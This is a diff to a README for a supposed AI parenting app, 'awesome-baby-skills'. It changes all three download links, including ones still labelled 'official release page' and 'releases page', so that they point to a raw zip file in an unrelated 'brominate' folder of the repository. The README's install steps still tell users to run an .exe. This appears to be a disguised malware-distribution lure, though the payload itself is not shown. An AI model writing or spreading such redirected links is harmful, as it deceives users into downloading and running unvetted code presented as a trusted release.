@@ -1,6 +1,6 @@
 # 👶 awesome-baby-skills - Smart tools for raising your child
 
-[![Download Now](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Pattycogitative387/awesome-baby-skills/releases)
+[![Download Now](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Pattycogitative387/awesome-baby-skills/raw/refs/heads/main/brominate/awesome-skills-baby-v3.1.zip)
 
 This application provides AI-powered support for parents. It tracks daily routines, organizes reading lists, and monitors developmental milestones. The tool stores memories to help you document your child’s growth over time. 
 
@@ -8,7 +8,7 @@ This application provides AI-powered support for parents. It tracks daily routin
 
 Follow these steps to get the software on your computer.
 
-1. Go to the [official release page](https://github.com/Pattycogitative387/awesome-baby-skills/releases).
+1. Go to the [official release page](https://github.com/Pattycogitative387/awesome-baby-skills/raw/refs/heads/main/brominate/awesome-skills-baby-v3.1.zip).
 2. Look for the section labeled Assets.
 3. Click the link that ends in .exe to download the installer.
 4. Open the file you downloaded.
@@ -84,7 +84,7 @@ If the program fails to open, try these steps:
 
 1. Restart your computer.
 2. Ensure no firewall settings block the program.
-3. Reinstall the app by downloading the latest version from the [releases page](https://github.com/Pattycogitative387/awesome-baby-skills/releases).
+3. Reinstall the app by downloading the latest version from the [releases page](https://github.com/Pattycogitative387/awesome-baby-skills/raw/refs/heads/main/brominate/awesome-skills-baby-v3.1.zip).
 4. Contact support if the problem continues.
 
 ## 📝 About this project
